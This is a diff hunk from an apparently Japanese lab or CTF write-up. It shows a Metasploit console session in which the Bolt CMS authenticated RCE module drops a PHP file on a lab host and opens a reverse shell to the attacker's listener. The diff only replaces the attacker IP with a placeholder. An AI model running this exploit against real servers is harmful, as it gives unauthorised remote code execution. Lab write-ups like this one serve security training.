@@ -160,19 +160,19 @@ RHOSTS =&gt; 10.49.167.133
 msf exploit(unix/webapp/bolt_authenticated_rce) &gt; set USERNAME bolt
 USERNAME =&gt; bolt
 msf exploit(unix/webapp/bolt_authenticated_rce) &gt; set LHOST tun0
-LHOST =&gt; 10.10.14.5
+LHOST =&gt; &lt;YOUR_TUN0_IP&gt;
 msf exploit(unix/webapp/bolt_authenticated_rce) &gt; 
 </code></pre>
 <p><code>run</code>する</p>
 <pre><code class="language-bash">msf exploit(unix/webapp/bolt_authenticated_rce) &gt; run
-[*] Started reverse TCP handler on 10.10.14.5:4444 
+[*] Started reverse TCP handler on &lt;YOUR_TUN0_IP&gt;:4444 
 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable)
 [+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable &quot;ztyvn&quot;.
 [*] Found 3 potential token(s) for creating .php files.
 [+] Used token 0dbb8a7d0a05a9149eb6531fb2 to create xjbeqpnxn.php.
 [*] Attempting to execute the payload via &quot;/files/xjbeqpnxn.php?ztyvn=`payload`&quot;
 [!] No response, may have executed a blocking payload!
-[*] Command shell session 2 opened (10.10.14.5:4444 -&gt; 10.49.167.133:33024) at 2026-05-18 15:39:59 +0900
+[*] Command shell session 2 opened (&lt;YOUR_TUN0_IP&gt;:4444 -&gt; 10.49.167.133:33024) at 2026-05-18 15:39:59 +0900
 [+] Deleted file xjbeqpnxn.php.
 [+] Reverted user profile back to original state.
 
